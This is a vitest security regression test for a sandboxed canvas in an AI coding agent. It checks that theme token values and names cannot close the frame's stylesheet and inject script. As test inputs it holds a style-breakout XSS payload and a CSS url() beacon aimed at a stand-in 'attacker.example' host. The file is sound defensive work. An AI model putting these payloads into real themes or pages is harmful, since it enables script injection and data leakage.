/**
 * Mysti - AI Coding Agent
 * Copyright (c) 2025 DeepMyst Inc. All rights reserved.
 *
 * SPDX-License-Identifier: Apache-2.0
 *
 * CANVAS-SEC-1 — the theme is the one model-authored string `buildPageDocument`
 * used to concatenate raw.
 *
 * Every other model string in that builder is routed through `jsonForScript`
 * (JSON, with `<` escaped) or `escapeForScript`. The `--theme-*` block was not:
 * token names and values were interpolated verbatim into the document's
 * `<style>` element, so a value containing `</style><script>` closed the
 * stylesheet and injected a script that the frame's own CSP (`script-src
 * 'unsafe-inline'`) then executed — in `<head>`, i.e. BEFORE `harness.js`, which
 * is what made it able to register a `message` listener and read the transferred
 * port off the same handshake event.
 *
 * Theme values are reachable by the agent (`set_theme` / `set_theme_token`), by
 * a Figma import, and by a hostile `.mysti/canvas/<id>/artifact.json` in a
 * cloned repo — `validatePersistedArtifact` checks the shape of `theme.colors`,
 * never its values.
 *
 * The fix validates rather than escapes: a CSS custom-property value has a
 * narrow legal grammar, and the same grammar is already enforced by the two
 * OTHER consumers of `themeTokenMap` (`harness.js`'s `applyThemeTokens` and the
 * parent-side `themeCssVars`), so this test also pins that all three agree.
 */
import { describe, it, expect } from 'vitest';
import {
  buildThemeCssVars,
  safeThemeTokenMap,
  themeTokenMap,
  buildPageDocument,
} from '../../src/managers/CanvasSandbox';
import type { SandboxRuntime } from '../../src/managers/CanvasSandbox';
import { DesignSpecManager } from '../../src/managers/DesignSpecManager';
import { THEME_PRESETS } from '../../src/managers/CanvasThemePresets';
import { getFormat } from '../../src/managers/CanvasFormats';
import type { ArtifactPage, DesignTheme } from '../../src/types';

const desktop = getFormat('desktop')!;

const runtime: SandboxRuntime = {
  headScripts: ['/*react*/window.React={};'],
  harness: '/*harness*/void 0;',
};

function docPage(over: Partial<ArtifactPage> = {}): ArtifactPage {
  return {
    id: 'p1',
    version: 1,
    doc: { mid: 'aaaaaaaaaa', tag: 'UI.Screen', children: [{ mid: 'bbbbbbbbbb', tag: 'UI.Heading', text: 'Hi' }] },
    boardPos: { x: 0, y: 0 },
    ...over,
  };
}

/** A theme carrying an attacker-supplied token value / token name. */
function poisoned(over: { primary?: string; extraKey?: string }): DesignTheme {
  const base = DesignSpecManager.getDefaultTheme();
  const colors: Record<string, string> = { ...base.colors };
  if (over.primary !== undefined) { colors.primary = over.primary; }
  if (over.extraKey !== undefined) { colors[over.extraKey] = 'red'; }
  return { ...base, colors: colors as DesignTheme['colors'] };
}

const BREAKOUT = 'red; } </style><script>window.__PWN=1</script><style> x{y:z';

describe('CANVAS-SEC-1: a theme token cannot break out of the frame stylesheet', () => {
  it('buildThemeCssVars refuses a value carrying </style><script>', () => {
    const css = buildThemeCssVars(poisoned({ primary: BREAKOUT }));
    expect(css).not.toContain('<script>');
    expect(css).not.toContain('</style>');
    expect(css).not.toContain('__PWN');
    // The poisoned token is dropped entirely rather than half-written.
    expect(css).not.toContain('--theme-color-primary:');
  });

  it('buildPageDocument emits no injected script for a poisoned theme (doc mode)', () => {
    const html = buildPageDocument({
      page: docPage(), theme: poisoned({ primary: BREAKOUT }), format: desktop, runtime,
    });
    expect(html).not.toContain('<script>window.__PWN=1</script>');
    expect(html).not.toContain('__PWN');
    // and the `<style>` block is still closed exactly once by the builder.
    expect(html.match(/<\/style>/g) ?? []).toHaveLength(1);
  });

  it('buildPageDocument emits no injected script for a poisoned theme (legacy html mode)', () => {
    // The legacy frame is the worse case: SANDBOX_INNER_CSP still allows
    // `script-src 'unsafe-inline' 'unsafe-eval'`, so an injected script there
    // runs (E-2 narrowed its `img-src` to `data: blob:`, closing the beacon
    // half — the injection half is what this test pins).
    const html = buildPageDocument({
      page: docPage({ legacy: { mode: 'html', source: '<p>hi</p>' } }),
      theme: poisoned({ primary: BREAKOUT }), format: desktop, runtime,
    });
    expect(html).not.toContain('__PWN');
    expect(html.match(/<\/style>/g) ?? []).toHaveLength(1);
  });

  it('refuses a token NAME that would close the declaration', () => {
    // `theme.colors` is a plain record, so the KEY is model-authored too.
    const css = buildThemeCssVars(poisoned({ extraKey: 'x: red; } </style><script>window.__PWN=1</script><style> y' }));
    expect(css).not.toContain('__PWN');
    expect(css).not.toContain('</style>');
  });

  it('refuses url() so a token cannot become a GET beacon in a legacy frame', () => {
    const css = buildThemeCssVars(poisoned({ primary: 'url(https://attacker.example/?leak)' }));
    expect(css).not.toContain('attacker.example');
  });

  it('drops only the poisoned token — every other token survives', () => {
    const css = buildThemeCssVars(poisoned({ primary: BREAKOUT }));
    expect(css).toContain('--theme-font-body:');
    expect(css).toContain('--theme-radius-md:');
    expect(css).toContain('--theme-shadow-sm:');
  });

  it('safeThemeTokenMap is a strict subset of themeTokenMap and is what the CSS is built from', () => {
    const theme = poisoned({ primary: BREAKOUT });
    const raw = themeTokenMap(theme);
    const safe = safeThemeTokenMap(theme);
    expect(Object.keys(safe).length).toBeLessThan(Object.keys(raw).length);
    for (const [name, value] of Object.entries(safe)) {
      expect(raw[name]).toBe(value);
    }
    const css = buildThemeCssVars(theme);
    for (const [name, value] of Object.entries(safe)) {
      expect(css).toContain(`--theme-${name}: ${value};`);
    }
  });

  it('every SHIPPED theme survives the filter unchanged — the gate is not a content regression', () => {
    for (const theme of [DesignSpecManager.getDefaultTheme(), ...THEME_PRESETS.map(p => p.theme)]) {
      expect(safeThemeTokenMap(theme)).toEqual(themeTokenMap(theme));
    }
  });
});
